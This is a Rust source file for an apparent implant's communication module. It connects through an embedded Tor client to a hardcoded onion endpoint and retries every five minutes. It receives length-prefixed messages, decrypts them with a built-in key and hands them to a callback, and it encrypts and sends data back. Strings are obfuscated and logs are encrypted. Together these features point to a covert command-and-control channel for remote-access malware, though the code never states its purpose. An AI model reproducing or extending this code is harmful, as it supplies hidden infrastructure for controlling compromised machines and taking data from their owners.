use std::{ path::PathBuf, sync::{ Arc, Mutex }, time::Duration };
use anyhow::{ Context, Result };
use arti_client::{ DataStream, StreamPrefs, TorClient, TorClientConfig };
use obfstr::obfstr as s;
use crate::{ ref_err, ref_log_internal, utils::encryption::sauron_encrypt };
use crate::{
    constants::{ communication_encryption_key, onion_endpoint },
    logs::logger::Logger,
    ref_tag,
    utils::encryption::{ convert_key_to_bytes, sauron_decrypt },
};
use tokio::io::{ AsyncReadExt, AsyncWriteExt };

pub type StreamRef = Arc<Mutex<DataStream>>;
pub type TorClientRef = Arc<Mutex<TorClient<tor_rtcompat::PreferredRuntime>>>;

#[derive(Clone)]
pub struct TorHandler {
    tor_client: TorClientRef,
    stream_prefs: Arc<Mutex<StreamPrefs>>,
    stream: Option<StreamRef>,
    tcp_receive_poll_delay_ms: u64,
    retry_connect_interval_ms: u64,
    retry_read_stream_interval_ms: u64,
    pub logger: Arc<Mutex<Logger>>,
}

impl TorHandler {
    pub async fn new(log_directory: PathBuf, log_encryption_key: String) -> Result<Self> {
        let config = TorClientConfig::default();
        let tor_client = TorClient::create_bootstrapped(config).await.context(
            s!("Failed to create Tor client").to_string()
        )?;
        let mut stream_prefs: StreamPrefs = StreamPrefs::default();
        stream_prefs.connect_to_onion_services(arti_client::config::BoolOrAuto::Explicit(true));
        let logger = Arc::new(Mutex::new(Logger::new(log_directory, log_encryption_key)?));
        ref_tag!(logger.lock().unwrap(), "TOR-HANDLER");

        let tor_handler = TorHandler {
            stream: None,
            logger,
            tor_client: Arc::new(Mutex::new(tor_client)),
            stream_prefs: Arc::new(Mutex::new(stream_prefs)),
            tcp_receive_poll_delay_ms: 100,
            retry_connect_interval_ms: 5 * 60 * 1000, // 5 minutes
            retry_read_stream_interval_ms: 100,
        };
        Ok(tor_handler)
    }
    pub async fn connect_to_endpoint(&mut self) -> Result<()> {
        let tor_client = self.tor_client.lock().unwrap();
        let stream_prefs = self.stream_prefs.lock().unwrap();
        let stream = tor_client
            .connect_with_prefs((onion_endpoint(), 80), &stream_prefs).await
            .context(s!("Failed to connect to onion endpoint").to_string())?;

        self.stream = Some(Arc::new(Mutex::new(stream)));

        Ok(())
    }
    pub async fn run<F>(&mut self, callback: F)
        where F: FnMut(&mut Self, Vec<u8>) -> Result<()> + Send + Sync + Copy + 'static
    {
        loop {
            match self.connect_to_endpoint().await {
                Ok(()) => {
                    loop {
                        if let Err(error) = self.handle_receive(callback).await {
                            ref_err!(
                                self.logger.lock().unwrap(),
                                "Failed to handle_receive: ",
                                error
                            );
                        }
                        tokio::time::sleep(
                            Duration::from_millis(self.retry_read_stream_interval_ms)
                        ).await;
                    }
                }
                Err(_error) => {
                    ref_err!(self.logger.lock().unwrap(), "Failed to connect_to_endpoint");
                }
            }
            tokio::time::sleep(Duration::from_millis(self.retry_connect_interval_ms)).await;
        }
    }
    async fn handle_receive<F>(&mut self, mut callback: F) -> Result<()>
        where F: FnMut(&mut Self, Vec<u8>) -> Result<()> + Send + Sync + Copy + 'static
    {
        loop {
            let data = self
                .read_data().await
                .context(s!("Failed to read_data from stream").to_string())?;

            let mut self_clone = self.clone();
            tokio::task::spawn(async move {
                if
                    let Ok(decrypted_data) = sauron_decrypt(
                        convert_key_to_bytes(&communication_encryption_key()),
                        &data
                    )
                {
                    if let Err(error) = callback(&mut self_clone, decrypted_data) {
                        ref_err!(
                            self_clone.logger.lock().unwrap(),
                            "Failed to process data via callback: ",
                            error
                        );
                    };
                }
            });

            tokio::time::sleep(Duration::from_millis(self.tcp_receive_poll_delay_ms)).await;
        }
    }

    async fn read_data(&mut self) -> Result<Vec<u8>> {
        let read_stream_ref = self.get_stream()?;

        let mut stream = read_stream_ref.lock().unwrap();
        stream.wait_for_connection().await?;
        let data_length = stream.read_u32_le().await?;

        let mut data_buf = vec![0; data_length as usize];
        stream
            .read_exact(&mut data_buf).await
            .context(s!("Failed to read exact data from stream").to_string())?;
        Ok(data_buf)
    }
    pub async fn encrypt_and_send(&mut self, data: &[u8]) -> Result<()> {
        let encrypted_data = sauron_encrypt(
            convert_key_to_bytes(&communication_encryption_key()),
            data
        )?;
        self.send_data(&encrypted_data).await
    }

    async fn send_data(&mut self, data: &[u8]) -> Result<()> {
        let read_stream_ref = self.get_stream()?;
        let mut stream = read_stream_ref.lock().unwrap();
        stream.write_all(data).await.context(s!("Failed to write to stream").to_string())?;
        stream.flush().await.context(s!("Failed to flush stream").to_string())?;
        Ok(())
    }
    fn get_stream(&self) -> Result<StreamRef> {
        match &self.stream {
            Some(stream) => Ok(stream.clone()),
            None => { Err(anyhow::anyhow!(s!("Data Stream not initialized").to_string())) }
        }
    }
}
